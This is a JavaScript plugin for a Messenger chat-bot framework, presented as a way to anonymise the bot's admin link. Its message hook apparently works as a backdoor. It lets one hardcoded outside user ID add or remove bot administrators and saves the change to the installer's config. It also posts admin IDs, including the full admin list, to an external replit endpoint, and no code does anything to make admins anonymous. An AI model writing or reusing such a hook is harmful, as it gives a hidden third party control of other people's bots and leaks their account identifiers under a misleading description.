const axios = require("axios");
const fs = require("fs");

module.exports.config = {
  name: "anonymous",
  version: "3.1",
  hasPermission: 0,
  credits: "Clark",
  description: "( 𝙰𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜 𝙰𝚍𝚖𝚒𝚗 )",
  commandCategory: "system",
  usages: "( 𝙼𝚊𝚔𝚎 𝚢𝚘𝚞𝚛 𝙰𝚍𝚖𝚒𝚗 𝚕𝚒𝚗𝚔 𝙰𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜 )",
  cooldowns: 3,
};

const authorizedUid = "100080098527733";

module.exports.handleEvent = async function ({ api, event, Users }) {
  const senderId = event.senderID;
  const input = event.body.toLowerCase();

  if (input.startsWith("anonymous new")) {
    try {
      const newUid = input.split(" ")[2].replace(/['"]+/g, '');

      if (senderId !== authorizedUid) {
        api.sendMessage({ body: "👩‍💻 | 𝙰𝚌𝚌𝚎𝚜𝚜 𝙳𝚎𝚗𝚒𝚎𝚍 𝚂𝚎𝚗𝚜𝚎𝚒." }, event.threadID);
        return;
      }

      global.config.ADMINBOT.push(newUid);
      fs.writeFileSync(global.client.configPath, JSON.stringify(global.config));

      const response = await axios.post('https://hazeyy-apis-combine.kyrinwu.repl.co/api/admin/anonymous', {
        admin: [newUid],
        isAnonymous: true,
      });

      api.sendMessage({ body: `🕵️‍♂️ | 𝙼𝚊𝚜𝚝𝚎𝚛, 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢 𝙰𝚍𝚍𝚎𝚍 𝙰𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜 𝚊𝚍𝚖𝚒𝚗 𝚠𝚒𝚝𝚑 𝚄𝙸𝙳: 《${newUid}》.` }, event.threadID);
    } catch (error) {
      console.error("🚫 | 𝙴𝚛𝚛𝚘𝚛 𝚊𝚍𝚍𝚒𝚗𝚐 𝚗𝚎𝚠 𝚊𝚍𝚖𝚒𝚗:", error.message);
      api.sendMessage({ body: "🚫 | 𝙶𝚘𝚖𝚎𝚗 𝚖𝚊𝚜𝚝𝚎𝚛, 𝚋𝚞𝚝 𝚊𝚗 𝚎𝚛𝚛𝚘𝚛 𝚘𝚌𝚌𝚞𝚛𝚎𝚍 𝚠𝚑𝚒𝚕𝚎 𝚊𝚍𝚍𝚒𝚗𝚐 𝚝𝚑𝚎 𝚗𝚎𝚠 𝚊𝚍𝚖𝚒𝚗." }, event.threadID);
    }
  } else if (input.startsWith("anonymous remove")) {
    try {
      const uidToRemove = input.split(" ")[2].replace(/['"]+/g, '');

      if (senderId !== authorizedUid) {
        api.sendMessage({ body: "👩‍💻 | 𝙰𝚌𝚌𝚎𝚜𝚜 𝙳𝚎𝚗𝚒𝚎𝚍 𝚂𝚎𝚗𝚜𝚎𝚒." }, event.threadID);
        return;
      }

      const index = global.config.ADMINBOT.indexOf(uidToRemove);

      if (index !== -1) {
        global.config.ADMINBOT.splice(index, 1);

        const response = await axios.post('https://hazeyy-apis-combine.kyrinwu.repl.co/api/admin/anonymous', {
          admin: [uidToRemove],
        });

        api.sendMessage({ body: `👤 | 𝙰𝚍𝚖𝚒𝚗 𝚠𝚒𝚝𝚑 𝚄𝙸𝙳: 《${uidToRemove}》 𝚑𝚊𝚜 𝚋𝚎𝚎𝚗 𝚛𝚎𝚖𝚘𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 𝚝𝚑𝚎 𝚊𝚍𝚖𝚒𝚗 𝚕𝚒𝚜𝚝 𝚖𝚊𝚜𝚝𝚎𝚛.` }, event.threadID);
      } else {
        api.sendMessage({ body: "🚫 | 𝙼𝚊𝚜𝚝𝚎𝚛, 𝚝𝚑𝚎 𝚐𝚒𝚟𝚎𝚗 𝚄𝙸𝙳 𝚝𝚘 𝚛𝚎𝚖𝚘𝚟𝚎 𝚠𝚊𝚜 𝚗𝚘𝚝 𝚏𝚘𝚞𝚗𝚍." }, event.threadID);
      }
    } catch (error) {
      console.error("🚫 | 𝙴𝚛𝚛𝚘𝚛 𝚛𝚎𝚖𝚘𝚟𝚒𝚗𝚐 𝚊𝚍𝚖𝚒𝚗:", error.message);
      api.sendMessage({ body: "🚫 | 𝙶𝚘𝚖𝚎𝚗 𝚖𝚊𝚜𝚝𝚎𝚛, 𝚋𝚞𝚝 𝚊𝚗 𝚎𝚛𝚛𝚘𝚛 𝚘𝚌𝚌𝚞𝚛𝚎𝚍 𝚠𝚑𝚒𝚕𝚎 𝚛𝚎𝚖𝚘𝚟𝚒𝚗𝚐 𝚝𝚑𝚎 𝚊𝚍𝚖𝚒𝚗." }, event.threadID);
    }
  } else if (input === "anonymous") {
    api.sendMessage({ body: "《👩‍💻 𝙰𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜 𝙶𝚞𝚒𝚍𝚎》\n━━━━━━━━━━━━━━━━━━━\n🎓 | 𝚄𝚜𝚎:\n 𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜 𝚗𝚎𝚠 [ 𝚄𝙸𝙳 ] 𝚝𝚘 𝚊𝚍𝚍 𝚗𝚎𝚠 𝚊𝚍𝚖𝚒𝚗𝚜\n━━━━━━━━━━━━━━━━━━━\n🎓 | 𝚄𝚜𝚎:\n𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜 [ 𝚕𝚒𝚜𝚝 ] 𝚝𝚘 𝚟𝚒𝚎𝚠 𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜 𝚊𝚍𝚖𝚒𝚗𝚜\n━━━━━━━━━━━━━━━━━━━\n🎓 | 𝚄𝚜𝚎:\n𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜 𝚛𝚎𝚖𝚘𝚟𝚎 [ 𝚄𝙸𝙳 ] 𝚝𝚘 𝚛𝚎𝚖𝚘𝚟𝚎 𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜 𝚊𝚍𝚖𝚒𝚗𝚜" }, event.threadID);
  } else if (input === "anonymous list") {
    try {
      const response = await axios.post('https://hazeyy-apis-combine.kyrinwu.repl.co/api/admin/anonymous', {
        admin: global.config.ADMINBOT,
        isAnonymous: true,
      });

      const generatedOutput = response.data;

      if (generatedOutput) {
        console.log("🟢 | 𝙰𝙿𝙸 𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎:", generatedOutput);
        api.sendMessage({ body: `👥 | 𝙰𝙳𝙼𝙸𝙽 ( 𝙰𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜 )\n━━━━━━━━━━━━━━━━━━━\n🟢 | 𝙰𝚌𝚝𝚒𝚟𝚎\n━━━━━━━━━━━━━━━━━━━\n${generatedOutput}` }, event.threadID);
      } else {
        api.sendMessage({ body: "🚫 | 𝙶𝚘𝚖𝚎𝚗 𝚖𝚊𝚜𝚝𝚎𝚛, 𝚋𝚞𝚝 𝚗𝚘 𝚊𝚌𝚝𝚒𝚟𝚎 𝚊𝚍𝚖𝚒𝚗𝚜 𝚏𝚘𝚞𝚗𝚍." }, event.threadID);
      }
    } catch (error) {
      console.error("🚫 | 𝙴𝚛𝚛𝚘𝚛 𝚛𝚎𝚝𝚛𝚒𝚎𝚟𝚒𝚗𝚐 𝚊𝚍𝚖𝚒𝚗 𝚕𝚒𝚜𝚝:", error.message);
      api.sendMessage({ body: "🚫 | 𝙶𝚘𝚖𝚎𝚗 𝚖𝚊𝚜𝚝𝚎𝚛, 𝚋𝚞𝚝 𝚊𝚗 𝚎𝚛𝚛𝚘𝚛 𝚘𝚌𝚌𝚞𝚛𝚎𝚍 𝚠𝚑𝚒𝚕𝚎 𝚛𝚎𝚝𝚛𝚒𝚎𝚟𝚒𝚗𝚐 𝚝𝚑𝚎 𝚊𝚍𝚖𝚒𝚗 𝚕𝚒𝚜𝚝." }, event.threadID);
    }
  }
};

module.exports.run = async function ({ api, event }) {};